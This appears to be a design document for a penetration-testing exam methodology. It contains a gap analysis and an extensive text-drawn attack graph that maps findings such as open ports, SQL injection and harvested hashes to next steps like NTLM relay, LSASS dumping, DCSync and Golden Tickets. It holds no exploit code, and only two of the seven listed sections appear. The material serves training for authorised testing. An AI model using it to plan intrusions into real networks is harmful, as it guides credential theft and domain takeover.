# Phase 2: Attack Graph & Decision Engine Enhancement

## Engineering-Level Design Document

---

## Table of Contents

1. [Comprehensive Gap Analysis](#1-comprehensive-gap-analysis)
2. [Master Attack Graph Design](#2-master-attack-graph-design)
3. [Missing Decision Trees](#3-missing-decision-trees)
4. [Attack Chain Mapping](#4-attack-chain-mapping)
5. [Stuck Matrix](#5-stuck-matrix)
6. [Attack Graph Module Specification](#6-attack-graph-module-specification)
7. [Methodology Quality Audit](#7-methodology-quality-audit)

---

## 1. Comprehensive Gap Analysis

### 1.1 Current State Assessment

The methodology has 16 modules covering the full penetration testing lifecycle. However, the current architecture is **phase-linear** — it describes what to do in each phase but lacks the **finding-to-action** wiring that makes a methodology truly operational for attack path analysis.

**Strengths of current architecture:**
- Strong modular organization by PTES phase
- Consistent template with entry checks, decision trees, output summaries
- Good cross-references between adjacent modules
- Solid coverage of all major CPTS topics
- Exam strategy module provides good top-level guidance
- Existing 3 decision trees (AD, privesc, web) provide good base

**Critical weakness:**
- No single file answers "I found X, what do I do now?"
- Cross-references are adjacency-based, not attack-path-based
- No formal attack graph encoding relationships between findings
- Decision trees exist for only 3 of 16 modules
- No stuck/troubleshooting matrix exists
- No credential flow tracking across modules
- No alternative path documentation

### 1.2 Missing Decision Trees

**Currently exists (3 trees):**
- `decision-trees/ad-attack-flow.md` (78 lines) — Good basic AD flow
- `decision-trees/privesc-flow.md` (126 lines) — Good Linux + Windows flow
- `decision-trees/web-attack-flow.md` (67 lines) — Good web flow

**Missing (13 trees):**

| Tree | Priority | Reason Missing |
|------|----------|----------------|
| Recon & OSINT Tree | CRITICAL | Module 01 has content but no standalone decision tree file |
| Service Enumeration Tree | CRITICAL | Module 02 has port descriptions but no branching decision logic |
| SMB Attack Tree | CRITICAL | Module 07 covers SMB but has no standalone decision tree |
| Database Attack Tree | HIGH | MSSQL/MySQL/PostgreSQL covered in Module 07 but no unified tree |
| FTP Attack Tree | MEDIUM | Covered in Module 07 but trivial; low priority |
| Password Attack Tree | CRITICAL | Module 06 has good content but no standalone tree |
| Lateral Movement Tree | CRITICAL | Module 12 has content but no standalone tree; referenced as `pivot-flow.md` in generation plan but doesn't exist |
| Post-Exploitation Tree | HIGH | Module 13 has content but no standalone tree |
| Common Apps Tree | HIGH | Module 08 has content but no standalone tree |
| Initial Access Tree | MEDIUM | Module 05 has content; RCE-to-shell decision logic is scattered |
| Pivoting Tree | HIGH | Referenced in generation plan as `pivot-flow.md`; does not exist |
| Credential Flow Tree | HIGH | No tree tracks what to do with credentials once obtained |
| Shell Upgrade Tree | LOW | Module 05 covers this; not complex enough for standalone tree |

### 1.3 Missing Attack Chains

**Formalized chains that exist (partial):**
- Web → SQLi → RCE (Module 04, partial)
- Web → LFI → Log Poison → RCE (Module 04, partial)
- Responder → Hash → Crack → Spray (Module 11, partial)
- BloodHound → Find path → Execute (Module 11, partial)

**Missing formal chains:**

| Chain | Modules Spanning | Impact |
|-------|-----------------|--------|
| DNS → Subdomains → VHosts → Web Apps | 01, 04 | HIGH - basic recon chain not formalized |
| SMB → Null session → User enum → Password spray | 02, 07, 06, 11 | CRITICAL - most common AD entry |
| SMB → Write share → Web shell → RCE | 07, 04, 05 | HIGH - cross-service pivot |
| SQLi → DB dump → Credentials → SSH/RDP/WinRM | 04, 07, 05, 12 | CRITICAL - common exam path |
| LFI → /etc/passwd → User enum → SSH keys | 04, 05, 07 | HIGH |
| LFI → Log Poisoning → RCE → Shell | 04, 05 | CRITICAL |
| File Upload → Web shell → Reverse shell → PrivEsc | 04, 05, 09/10 | CRITICAL |
| XSS → Session theft → Admin access → RCE | 04, 05 | MEDIUM |
| SSRF → Cloud metadata → Cloud creds → Pivot | 04, 12 | MEDIUM - exam relevant |
| Password Spray → User creds → BloodHound → DA path | 06, 11 | CRITICAL - standard AD flow |
| AS-REP Roast → Crack → User creds → Enum | 11, 06, 11 | HIGH |
| Kerberoast → Crack → Service creds → Lateral | 11, 06, 12 | CRITICAL |
| LDAP anonymous → Full user dump → Spray → Access | 07, 06, 11 | HIGH |
| NFS mount → SSH keys → User access → PrivEsc | 07, 05, 09/10 | MEDIUM |
| MSSQL xp_cmdshell → RCE → Windows shell → PrivEsc | 07, 05, 10 | HIGH |
| MSSQL linked servers → Lateral → Pivot | 07, 12 | HIGH |
| Redis → SSH key write → User access → PrivEsc | 07, 05, 09/10 | MEDIUM |
| MySQL LOAD_FILE/OUTFILE → Web shell | 07, 04, 05 | HIGH |
| SNMP read → User enum → Password spray | 07, 06, 11 | MEDIUM |
| WinRM creds → Evil-WinRM → Shell → PrivEsc | 07, 05, 10 | HIGH |
| RDP creds → Access → Cred harvest → Lateral | 07, 13, 12 | HIGH |
| Pass-the-Hash → SMB exec → Multiple hosts | 12, 11 | CRITICAL |
| DCSync → All hashes → Golden Ticket → Full domain | 11, 12 | CRITICAL |
| Child domain → KRBTGT → Extra SID → Parent domain | 11 | HIGH |
| ADCS ESC1 → Cert → Domain auth → DA | 11 | CRITICAL |
| Unconstrained delegation → TGT theft → DA | 11 | HIGH |
| ACL abuse ForceChangePassword → DA escalation | 11 | HIGH |
| Container escape (Docker) → Host root → AD | 09, 11 | MEDIUM |
| Linux cred harvest → SSH key reuse → Lateral | 13, 12 | HIGH |
| Windows LSASS dump → Domain creds → AD attack | 13, 11 | CRITICAL |
| PowerShell history → Creds → Lateral movement | 13, 12 | HIGH |
| GPP cpassword → Domain creds → AD attack | 13, 11 | HIGH |
| WebDav PUT → File upload → RCE | 04, 05 | MEDIUM |
| Tomcat manager → WAR upload → RCE | 08, 05 | HIGH |
| Jenkins Script Console → Groovy → RCE | 08, 05 | HIGH |
| Splunk custom app → RCE | 08, 05 | MEDIUM |
| WordPress plugin → RCE | 08, 05 | HIGH |

### 1.4 Missing Cross-Module Relationships

**Critical gaps in cross-module wiring:**

1. **Module 02 → Module 07**: Port-to-service mapping exists but no "which service to attack first" prioritization logic
2. **Module 04 → Module 08**: CMS detection described in both but no unified "CMS found → switch to Module 08" trigger
3. **Module 05 → Module 09/10**: Shell obtained → which privesc module is determined by OS, but no automated detection flow
4. **Module 06 → Module 12**: Cracked password → immediate lateral movement testing not formalized
5. **Module 11 → Module 06**: Domain hash obtained → parallel cracking workflow not formalized
6. **Module 13 → Module 06**: Every harvested credential triggers Module 06 — not documented as continuous loop
7. **Module 12 → Module 02**: Pivot deployed → must re-enumerate new subnet — transition not formalized
8. **Module 09/10 → Module 11**: Root/System on domain host → must dump creds and run AD module — documented but weak
9. **Module 07 → Module 11**: LDAP/SMB enumeration → triggers AD module — weak transition definition
10. **Module 03 → Module 05**: Vulnerability found → exploitation — no formal decision on MSF vs. manual

**Missing bidirectional references:**
- Module 04 should reference Module 07 for database ports found during web testing
- Module 07 should reference Module 04 for web-adjacent services (Tomcat, Jenkins)
- Module 06 should reference Module 12 (lateral movement) AND Module 11 (AD)
- Module 13 should reference Module 06, 12, 11 — not just one

### 1.5 Missing CPTS-Relevant Attack Paths

**Attack paths not formalized anywhere in methodology:**

| Attack Path | Where It Should Be | Priority |
|-------------|-------------------|----------|
| Shadow Credentials (msDS-KeyCredentialLink) | Module 11 | HIGH |
| gMSA password retrieval | Module 11 | MEDIUM |
| LAPS password read abuse | Module 11, 12 | HIGH |
| Group Policy Object (GPO) abuse | Module 11 | HIGH |
| DNS Admin → SYSTEM on DC | Module 10, 11 | HIGH |
| Exchange PRIV abuse (if present) | Module 11 | MEDIUM |
| Cross-forest trust exploitation (full chain) | Module 11 | MEDIUM |
| Cloud/hybrid identity attacks | Module 11 | LOW (CPTS scope) |
| PrintNightmare (CVE-2021-34527) escalation | Module 10 | HIGH (legacy) |
| NoPac (CVE-2021-42278/42287) | Module 11 | HIGH |
| PetitPotam (MS-EFSRPC abuse) | Module 11 | MEDIUM |
| Coercive auth methods (printerbug, petitpotam) | Module 11 | HIGH |
| SMB relay without signing (full chain) | Module 07, 11 | CRITICAL |
| WebSocket attack paths | Module 04 | LOW |
| GraphQL API testing | Module 04 | MEDIUM |
| Server-Side Template Injection (SSTI) | Module 04 | MEDIUM |
| Race conditions (file upload, TOCTOU) | Module 04 | LOW |
| JWT attacks beyond alg:none | Module 04 | MEDIUM |
| OAuth/OIDC misconfiguration | Module 04 | MEDIUM |
| SAML assertion manipulation | Module 04 | LOW |
| Kerberos Bronze Bit (CVE-2020-17049) | Module 11 | LOW |
| SMB compression (CVE-2023-23397) | Module 11 | LOW |
| WinRM over HTTP (no HTTPS) abuse | Module 07, 12 | MEDIUM |
| WMI abuse beyond wmiexec | Module 12 | MEDIUM |

### 1.6 Weak Areas for Exam Effectiveness

1. **No credential flow tracking**: The methodology doesn't answer "I have a credential, now what?" with a single decision tree
2. **No parallel execution model**: Despite mentioning parallel execution in MASTER_METHODOLOGY, no module formalizes running tasks in parallel
3. **No relative priority system**: Modules list techniques but don't say "try THIS before THAT" for exam time management
4. **No "host exhausted" checklist**: What to verify before abandoning a host is scattered across modules
5. **No subnet tracking**: When pivoting discovers new subnets, there's no formal subnet inventory process
6. **No credential reuse database**: Credentials found are mentioned but no structured database/reuse matrix
7. **No alternative path documentation**: When a path fails, "try something else" is the guidance — no specific alternative enumeration
8. **No tool output interpretation guide**: What does a specific nmap/smbclient/bloodhound result mean for next actions?

---

## 2. Master Attack Graph Design

### 2.1 Graph Architecture

The master attack graph is a directed graph where:

- **Nodes** = Findings (e.g., "Port 445 open", "Valid credential", "Web shell")
- **Edges** = Actions/techniques that transform one finding into another
- **Colors** = Phase/domain for quick visual scanning

```
Node types:
[ENUM]    Enumeration finding (passive/active scan result)
[ACCESS]  Access achieved (shell, service auth, web access)
[CRED]    Credential obtained (password, hash, ticket, key)
[PRIVESC] Privilege escalated (user → root, user → admin)
[PIVOT]   Pivoting opportunity (new subnet, dual-homed host)
[AD]      Active Directory finding (users, groups, trusts, ACLs)
[DOMAIN]  Domain dominance achieved (DA, DCSync, Golden Ticket)

Edge types:
──→  "leads to" / "enables"
══→  "required prerequisite"
╌╌→  "alternative path" (if primary fails)
══→  "critical path" (high success rate)
```

### 2.2 Complete Attack Graph

```
=====================================================================
                    MASTER ATTACK GRAPH
=====================================================================

=== ROOT: NETWORK ACCESS ===

[ENUM] Target IPs in scope
  │
  ├══→ [ENUM] TCP Port Scan (1-65535)
  │      │
  │      ├══→ [ENUM] Port 80/443 → [ENUM] Web Server
  │      │      │
  │      │      ├══→ [ENUM] Technology Fingerprint
  │      │      │      ├══→ [ENUM] Known CMS → [ENUM] CMS Version
  │      │      │      │      ├══→ [ACCESS] WordPress RCE (plugin/auth)
  │      │      │      │      ├══→ [ACCESS] Joomla RCE (com_*)
  │      │      │      │      ├══→ [ACCESS] Drupalgeddon
  │      │      │      │      └══→ [ACCESS] Tomcat Manager RCE
  │      │      │      │
  │      │      │      ├══→ [ENUM] Custom Application
  │      │      │      │      ├══→ [ENUM] Authentication
  │      │      │      │      │      ├══→ [CRED] Default creds → [ACCESS] Auth Session
  │      │      │      │      │      ├══→ [CRED] Brute force → [ACCESS] Auth Session
  │      │      │      │      │      └══→ [ACCESS] Registration → [ACCESS] Auth Session
  │      │      │      │      │
  │      │      │      │      ├══→ [ENUM] Content Discovery
  │      │      │      │      │      ├══→ [ENUM] Admin panels
  │      │      │      │      │      ├══→ [ENUM] API endpoints
  │      │      │      │      │      ├══→ [ENUM] Backup files (config leaks)
  │      │      │      │      │      └══→ [ENUM] Hidden functionality
  │      │      │      │      │
  │      │      │      │      ├══→ [ENUM] Injection Points
  │      │      │      │      │      ├══→ [CRED] SQL Injection
  │      │      │      │      │      │      ├══→ [CRED] DB credentials
  │      │      │      │      │      │      │      ├╌╌→ [ACCESS] MySQL/MSSQL service auth
  │      │      │      │      │      │      │      └╌╌→ [PRIVESC] MySQL UDF RCE
  │      │      │      │      │      │      │
  │      │      │      │      │      │      ├══→ [CRED] Web app user data
  │      │      │      │      │      │      │      └══→ [ACCESS] Admin login → [ACCESS] Admin panel
  │      │      │      │      │      │      │
  │      │      │      │      │      │      ├══→ [ACCESS] SQLi to RCE (xp_cmdshell, INTO OUTFILE)
  │      │      │      │      │      │      │      └══→ [ACCESS] OS Shell
  │      │      │      │      │      │      │
  │      │      │      │      │      │      └══→ [PIVOT] Database linked servers
  │      │      │      │      │      │             └══→ [ENUM] New hosts from linked queries
  │      │      │      │      │      │
  │      │      │      │      │      ├══→ [ACCESS] File Inclusion (LFI/RFI)
  │      │      │      │      │      │      ├══→ [CRED] /etc/passwd → User enum
  │      │      │      │      │      │      │      └══→ [CRED] SSH key discovery
  │      │      │      │      │      │      │
  │      │      │      │      │      │      ├══→ [CRED] Source code disclosure (php://filter)
  │      │      │      │      │      │      │      └══→ [CRED] DB creds in source
  │      │      │      │      │      │      │
  │      │      │      │      │      │      ├══→ [ACCESS] Log Poisoning → RCE
  │      │      │      │      │      │      │      └══→ [ACCESS] Reverse shell
  │      │      │      │      │      │      │
  │      │      │      │      │      │      └══→ [ACCESS] PHP wrappers → RCE (php://input, data://)
  │      │      │      │      │      │             └══→ [ACCESS] Reverse shell
  │      │      │      │      │      │
  │      │      │      │      │      ├══→ [ACCESS] Command Injection
  │      │      │      │      │      │      └══→ [ACCESS] Reverse shell
  │      │      │      │      │      │
  │      │      │      │      │      ├══→ [ACCESS] File Upload
  │      │      │      │      │      │      ├══→ [ACCESS] Web shell → RCE
  │      │      │      │      │      │      │      └══→ [ACCESS] Reverse shell
  │      │      │      │      │      │      └══→ [ACCESS] Phar deserialization → RCE
  │      │      │      │      │      │
  │      │      │      │      │      ├══→ [CRED] XSS (Stored)
  │      │      │      │      │      │      ├══→ [CRED] Session cookie theft
  │      │      │      │      │      │      │      └══→ [ACCESS] Session hijack
  │      │      │      │      │      │      ├══→ [CRED] Keylogging
  │      │      │      │      │      │      └══→ [ACCESS] CSRF → State-changing action
  │      │      │      │      │      │
  │      │      │      │      │      ├══→ [ACCESS] SSRF
  │      │      │      │      │      │      ├══→ [CRED] Cloud metadata credentials
  │      │      │      │      │      │      ├══→ [ENUM] Internal service discovery
  │      │      │      │      │      │      └══→ [ACCESS] Internal service exploitation
  │      │      │      │      │      │
  │      │      │      │      │      ├══→ [CRED] XXE
  │      │      │      │      │      │      ├══→ [CRED] File read (configs, source)
  │      │      │      │      │      │      ├══→ [ENUM] SSRF via XXE
  │      │      │      │      │      │      └══→ [ACCESS] RCE via expect:// or PHP wrapper
  │      │      │      │      │      │
  │      │      │      │      │      └══→ [CRED] IDOR
  │      │      │      │      │             └══→ [CRED] Other users' data / PII
  │      │      │      │      │
  │      │      │      │      └══→ [ENUM] Business Logic
  │      │      │      │             ├══→ [CRED] Mass assignment → PrivEsc
  │      │      │      │             ├══→ [ACCESS] HTTP verb tampering → Bypass auth
  │      │      │      │             └══→ [CRED] Open redirect → Phishing vector
  │      │      │      │
  │      │      │      └══→ [ENUM] No obvious vuln → Deeper content discovery
  │      │      │
  │      │      ├══→ [ENUM] Port 21 (FTP)
  │      │      │      ├══→ [CRED] Anonymous login
  │      │      │      │      ├══→ [CRED] Sensitive files (configs, creds)
  │      │      │      │      └══→ [ACCESS] Write access → Web shell upload
  │      │      │      └══→ [CRED] Brute force → FTP access
  │      │      │
  │      │      ├══→ [ENUM] Port 22 (SSH)
  │      │      │      ├══→ [CRED] Creds from elsewhere → SSH access
  │      │      │      └══→ [ENUM] SSH key discovery (from cred harvesting)
  │      │      │             └══→ [ACCESS] SSH key auth
  │      │      │
  │      │      ├══→ [ENUM] Port 25/465/587 (SMTP)
  │      │      │      ├══→ [ENUM] Open relay → Phishing capability
  │      │      │      └══→ [CRED] VRFY/EXPN → User enumeration
  │      │      │             └══→ [CRED] User list → Password spray
  │      │      │
  │      │      ├══→ [ENUM] Port 53 (DNS)
  │      │      │      ├══→ [ENUM] Zone transfer → Full DNS dump
  │      │      │      │      └══→ [ENUM] Subdomains → Web enum
  │      │      │      └══→ [ENUM] Subdomain brute force
  │      │      │             └══→ [ENUM] VHost discovery → Web enum
  │      │      │
  │      │      ├══→ [ENUM] Port 88 (Kerberos)
  │      │      │      └══→ [AD] Domain controller identified
  │      │      │             ├══→ [AD] AS-REP Roasting (no pre-auth)
  │      │      │             │      └══→ [CRED] Crack AS-REP hash → User creds
  │      │      │             └══→ [AD] Kerbrute user enumeration
  │      │      │                    └══→ [CRED] User list → Password spray
  │      │      │
  │      │      ├══→ [ENUM] Port 135/139/445 (SMB/RPC)
  │      │      │      ├══→ [ENUM] Null session / anonymous
  │      │      │      │      ├══→ [CRED] User enumeration
  │      │      │      │      │      └╌╌→ [CRED] Password spray
  │      │      │      │      ├══→ [ENUM] Share listing
  │      │      │      │      │      ├══→ [CRED] Read shares → Configs, creds
  │      │      │      │      │      └══→ [ACCESS] Write shares → Web shell / file drop
  │      │      │      │      └══→ [AD] Domain info (users, groups, policy)
  │      │      │      │
  │      │      │      ├══→ [ENUM] SMB signing disabled
  │      │      │      │      └══→ [ACCESS] NTLM relay
  │      │      │      │             ├══→ [ACCESS] Relay to SMB → Code exec on target
  │      │      │      │             └══→ [ACCESS] Relay to ADCS → Certificate → DA
  │      │      │      │
  │      │      │      ├══→ [ENUM] SMB version vulnerable
  │      │      │      │      └══→ [ACCESS] EternalBlue (MS17-010) → SYSTEM
  │      │      │      │
  │      │      │      └══→ [CRED] Creds found elsewhere → SMB auth
  │      │      │             ├══→ [ACCESS] PSExec / SMBexec → Shell
  │      │      │             ├══→ [ACCESS] File access via shares
  │      │      │             └══→ [ACCESS] Pass-the-Hash → Code exec
  │      │      │
  │      │      ├══→ [ENUM] Port 1433 (MSSQL)
  │      │      │      ├══→ [CRED] Default creds (sa:sa)
  │      │      │      ├══→ [CRED] Brute force
  │      │      │      └══→ [CRED] Creds from elsewhere
  │      │      │             ├══→ [ACCESS] xp_cmdshell → OS Shell
  │      │      │             ├══→ [PIVOT] Linked servers → Lateral movement
  │      │      │             ├══→ [CRED] Hash capture via xp_dirtree
  │      │      │             └══→ [CRED] Database credential dump
  │      │      │
  │      │      ├══→ [ENUM] Port 3306 (MySQL)
  │      │      │      ├══→ [CRED] Default creds (root:root)
  │      │      │      └══→ [CRED] Brute force
  │      │      │             ├══→ [CRED] LOAD_FILE → Read files
  │      │      │             ├══→ [ACCESS] INTO OUTFILE → Web shell
  │      │      │             └══→ [PRIVESC] UDF → OS commands
  │      │      │
  │      │      ├══→ [ENUM] Port 3389 (RDP)
  │      │      │      ├══→ [ENUM] BlueKeep (CVE-2019-0708)
  │      │      │      └══→ [CRED] Creds from elsewhere
  │      │      │             └══→ [ACCESS] RDP session
  │      │      │                    ├══→ [PRIVESC] Session hijack (SYSTEM req)
  │      │      │                    └══→ [CRED] Credential harvesting via GUI access
  │      │      │
  │      │      ├══→ [ENUM] Port 2049 (NFS)
  │      │      │      ├══→ [ENUM] showmount -e → Export listing
  │      │      │      └══→ [CRED] Mount → Read SSH keys, configs
  │      │      │             └══→ [ACCESS] SSH key → User access
  │      │      │
  │      │      ├══→ [ENUM] Port 389/636 (LDAP)
  │      │      │      └══→ [AD] Domain controller / AD access
  │      │      │             ├══→ [CRED] Anonymous bind → Full user dump
  │      │      │             │      └══→ [CRED] Password spray
  │      │      │             └══→ [AD] Authenticated LDAP → BloodHound data
  │      │      │
  │      │      ├══→ [ENUM] Port 5432 (PostgreSQL)
  │      │      │      ├══→ [CRED] Default creds (postgres:postgres)
  │      │      │      └══→ [CRED] Brute force
  │      │      │             └══→ [ACCESS] COPY FROM PROGRAM → RCE
  │      │      │
  │      │      ├══→ [ENUM] Port 5985/5986 (WinRM)
  │      │      │      └══→ [CRED] Creds from elsewhere
  │      │      │             └══→ [ACCESS] evil-winrm → Shell
  │      │      │
  │      │      ├══→ [ENUM] Port 6379 (Redis)
  │      │      │      └══→ [CRED] No auth
  │      │      │             ├══→ [ACCESS] SSH key write → User access
  │      │      │             └══→ [ACCESS] Web shell write
  │      │      │
  │      │      └══→ [ENUM] Port 161 (SNMP)
  │      │             └══→ [CRED] Community string (public)
  │      │                    ├══→ [ENUM] Running processes
  │      │                    ├══→ [ENUM] Installed software
  │      │                    ├══→ [CRED] Windows user enumeration
  │      │                    └══→ [AD] Domain info
  │      │
  │      ├══→ [ENUM] UDP Scan (if justified)
  │      │      └══→ (Same port-specific branches as TCP)
  │      │
  │      └╌╌→ [ENUM] Nothing found → Verify connectivity, try different scan types
  │
  └═╌→ [ENUM] Firewall blocking scans
         └══→ Move to passive/OSINT, check for pivot opportunities

=====================================================================
               AFTER INITIAL ACCESS GRAPH
=====================================================================

[ACCESS] Shell obtained
  │
  ├══→ [ENUM] Identify OS
  │      ├══→ Linux → [PRIVESC] Linux PrivEsc
  │      │      ├══→ [PRIVESC] sudo misconfig → Root
  │      │      ├══→ [PRIVESC] SUID binary → Root
  │      │      ├══→ [PRIVESC] Cron job injection → Root
  │      │      ├══→ [PRIVESC] Kernel exploit → Root
  │      │      ├══→ [PRIVESC] Capability abuse → Root
  │      │      ├══→ [PRIVESC] Docker/LXC group → Root
  │      │      ├══→ [PRIVESC] NFS root_squash → Root
  │      │      └═╌→ [PRIVESC] No path found → Deep re-enumeration
  │      │
  │      └══→ Windows → [PRIVESC] Windows PrivEsc
  │             ├══→ [PRIVESC] Token privilege (SeImpersonate)
  │             │      └══→ Potato exploit → SYSTEM
  │             ├══→ [PRIVESC] Service misconfig → SYSTEM
  │             ├══→ [PRIVESC] Unquoted path → SYSTEM
  │             ├══→ [PRIVESC] DLL hijacking → SYSTEM
  │             ├══→ [PRIVESC] Kernel exploit → SYSTEM
  │             ├══→ [PRIVESC] UAC bypass → Admin (if filtered)
  │             └═╌→ [PRIVESC] No path found → Deep re-enumeration
  │
  ├══→ [CRED] Credential Harvesting (Module 13)
  │      ├══→ [CRED] LSASS dump (Windows admin)
  │      │      └══→ [CRED] Domain credentials
  │      ├══→ [CRED] SAM dump (Windows admin)
  │      │      └══→ [CRED] Local account hashes
  │      ├══→ [CRED] /etc/shadow (Linux root)
  │      │      └══→ [CRED] Password hashes
  │      ├══→ [CRED] SSH key discovery
  │      │      └══→ [ACCESS] SSH to other hosts
  │      ├══→ [CRED] Config file scan
  │      │      └══→ [CRED] Database / application credentials
  │      ├══→ [CRED] Browser credential theft
  │      ├══→ [CRED] PowerShell/bash history
  │      │      └══→ [CRED] Command-line passwords
  │      └══→ [CRED] DPAPI master key (Windows)
  │             └══→ [CRED] Chrome/Firefox saved passwords
  │
  ├══→ [AD] Domain join check
  │      ├══→ Domain-joined
  │      │      ├══→ [AD] BloodHound enumeration
  │      │      │      ├══→ [AD] DA session on host → Token theft
  │      │      │      ├══→ [AD] Kerberoastable account
  │      │      │      │      └══→ [CRED] Crack TGS → Service creds
  │      │      │      ├══→ [AD] ACL abuse path
  │      │      │      ├══→ [AD] Delegation abuse
  │      │      │      ├══→ [AD] ADCS vulnerability
  │      │      │      └══→ [AD] DCSync rights
  │      │      │
  │      │      ├══→ [CRED] Domain dump via secretsdump
  │      │      │      └══→ [CRED] All domain hashes
  │      │      │             ├══→ [DOMAIN] KRBTGT hash → Golden Ticket
  │      │      │             └══→ [DOMAIN] DA hash → Full domain access
  │      │      │
  │      │      └══→ [AD] Trust relationship abuse
  │      │             └══→ [DOMAIN] Parent domain compromise
  │      │
  │      └══→ Not domain-joined → Check for pivot routes
  │
  ├══→ [PIVOT] Network enumeration
  │      ├══→ [PIVOT] Multi-homed host (2+ NICs)
  │      │      └══→ [PIVOT] Deploy pivot tool
  │      │             ├══→ [PIVOT] Ligolo-ng → Full subnet access
  │      │             ├══→ [PIVOT] Chisel → SOCKS proxy
  │      │             └══→ [PIVOT] SSHuttle → Full VPN tunnel
  │      │                    └══→ [ENUM] Scan new subnet (RESTART)
  │      │
  │      └══→ [PIVOT] Routing table shows other subnets
  │             └══→ [PIVOT] Route through existing access
  │                    └══→ [ENUM] Scan new subnet (RESTART)
  │
  └══→ [CRED] Cracking queue (Module 06 - runs in PARALLEL)
         └══→ [CRED] Cracked password
                └══→ [ACCESS] Lateral movement (test across services)
                       ├══→ [ACCESS] SSH access
                       ├══→ [ACCESS] WinRM access
                       ├══→ [ACCESS] RDP access
                       ├══→ [ACCESS] SMB exec
                       └══→ [AD] Domain service auth
                              └══→ [AD] Further AD enumeration

=====================================================================
                    LATERAL MOVEMENT & PIVOT GRAPH
=====================================================================

[CRED] Credentials obtained
  │
  ├══→ [PIVOT] Test credential against all hosts
  │      ├══→ [ACCESS] SMB (445) → PSExec / SMBexec
  │      ├══→ [ACCESS] WinRM (5985) → evil-winrm
  │      ├══→ [ACCESS] RDP (3389) → xfreerdp
  │      ├══→ [ACCESS] SSH (22) → ssh
  │      ├══→ [ACCESS] MSSQL (1433) → mssqlclient
  │      └══→ [ACCESS] Pass-the-Hash variants
  │
  ├══→ [PRIVESC] Test credential on current host
  │      └══→ [PRIVESC] Higher privilege user? → More access
  │
  └══→ [AD] Domain credential flow
         ├══→ [AD] Spray domain users
         ├══→ [AD] Kerberoast (if domain user)
         └══→ [AD] BloodHound with creds

=====================================================================
                    DOMAIN DOMINANCE GRAPH
=====================================================================

[AD] Any domain access
  │
  ├══→ [AD] BloodHound (credentialed)
  │      ├══→ [DOMAIN] DA Session → Cred theft → DA
  │      ├══→ [DOMAIN] Kerberoast → Service creds → Lateral → DA path
  │      ├══→ [DOMAIN] ACL abuse → DA escalation
  │      ├══→ [DOMAIN] Delegation abuse → Impersonate DA
  │      ├══→ [DOMAIN] ADCS ESC1 → Cert auth → DA
  │      ├══→ [DOMAIN] DCSync rights → Dump all hashes → DA
  │      └══→ [DOMAIN] GPO abuse → Deploy malicious policy → DA
  │
  ├══→ [CRED] DCSync (if DA/appropriate rights)
  │      └══→ [CRED] All domain hashes
  │             ├══→ [DOMAIN] Golden Ticket
  │             ├══→ [DOMAIN] Silver Ticket
  │             └══→ [DOMAIN] Full lateral movement capability
  │
  ├══→ [DOMAIN] Child → Parent trust
  │      └══→ [DOMAIN] Extra SID → Parent domain DA
  │
  └══→ [DOMAIN] Domain dominance achieved
         └══→ [PIVOT] New subnets / trusts discovered
                └══→ [ENUM] RESTART on new domains/subnets

=====================================================================
                    PARALLEL PROCESSES
=====================================================================

[CRED] Hash obtained  ═══→ [CRED] Cracking (Module 06)
  (Continues in background)   │
                              ├══→ [CRED] Dictionary attack (rockyou)
                              ├══→ [CRED] Rule-based (best64.rule)
                              └══→ [CRED] Mask attack (pattern)

[ENUM] Scan complete → [CRED] Document findings (Module 14)
  (Continuous documentation)

[CRED] Password found → [PIVOT] Test password reuse
  (Immediate, parallel to other work)

=====================================================================
                    ALTERNATIVE PATHS (Failure Recovery)
=====================================================================

PRIMARY PATH FAILED → Alternative path:
  │
  Web LFI → Log Poison failed
  ═╌→ Try PHP wrappers (php://filter, php://input, data://)
  ═╌→ Try RFI with different protocol (ftp://, expect://)
  ═╌→ Try /proc/self/environ instead of access.log
  ═╌→ Abandon LFI, switch to file upload/SQLi
  │
  SQLi found but DB user lacks FILE priv
  ═╌→ Extract data only (no RCE via SQL)
  ═╌→ Use extracted creds for other services
  ═╌→ Check for SQLi in other parameters
  │
  SMB null session failed
  ═╌→ Try SMBv1 (enable in client)
  ═╌→ Check MS17-010 vulnerability
  ═╌→ Move to other services on same host
  ═╌→ Try Responder for hash capture
  │
  Kerberoasting: no SPNs found
  ═╌→ Check for AS-REP roastable users
  ═╌→ Check for delegation
  ═╌→ Run BloodHound for ACL paths
  ═╌→ Password spray instead
  │
  Linux privesc: no sudo, no SUID, no cron
  ═╌→ Check capabilities (getcap -r /)
  ═╌→ Check for kernel exploit (searchsploit)
  ═╌→ Check Docker/LXC group
  ═╌→ Check other users' homes for SSH keys
  ═╌→ Monitor with pspy for transient jobs
  │
  Windows privesc: no token privs, no service issues
  ═╌→ Check AlwaysInstallElevated
  ═╌→ Check registry auto-runs
  ═╌→ Check for kernel exploit (Watson)
  ═╌→ Check scheduled tasks
  ═╌→ Check for mounted VHDX/VMDK
```

### 2.3 Finding-to-Action Lookup Table

This table provides the raw mapping for every common finding:

| Finding | Immediate Action | Follow-On Enum | Exploitation | Credential Opp | PrivEsc Opp | Lateral Opp | Domain Opp |
|---------|-----------------|----------------|--------------|----------------|-------------|-------------|------------|
| Port 80/443 | Fingerprint tech | Content discovery | SQLi, LFI, Upload | DB creds in configs | Web shell → OS user | — | — |
| Port 445 (SMB) | Null session check | Share enum, user enum | EternalBlue, Relay | Share files | — | Pass-the-Hash | Domain info via RPC |
| Port 1433 (MSSQL) | Default creds | Linked server enum | xp_cmdshell | SA hash, db creds | — | Linked servers | — |
| Port 389 (LDAP) | Anonymous bind | Dump directory | — | User list for spray | — | — | Full AD recon |
| Port 88 (Kerberos) | AS-REP check | User enum via Kerbrute | AS-REP roast | Crackable hash | — | — | Domain user access |
| Port 5985 (WinRM) | Check creds | — | — | Any cred = shell | — | Lateral via WinRM | — |
| LFI vulnerability | Wrapper testing | File reading | Log poison → RCE | Config creds | — | SSH key discovery | — |
| SQL injection | DB fingerprint | Table enumeration | Data extract → RCE | DB credentials | — | Linked servers | — |
| File upload | Extension testing | Path discovery | Web shell | — | — | — | — |
| Valid credential | Spray across hosts | Service enumeration | Auth to services | — | Test for priv user | Full lateral | Domain auth |
| NT hash (NTLM) | Crack with hashcat | Pass-the-Hash test | — | Cleartext password | — | PTH to SMB/WinRM/RDP | Domain auth |
| TGS ticket | Crack with hashcat | — | Silver ticket | Service password | — | Service lateral | Kerberoast chain |
| Shell (Linux) | OS/network enum | User enum | — | Configs, shadow | Full privesc chain | SSH keys, cred reuse | Domain check |
| Shell (Windows) | OS/network enum | Token check | — | LSASS, SAM | Full privesc chain | PTH, cred reuse | Domain check |
| BloodHound path | Validate path | — | Execute attack | — | — | — | DA escalation |
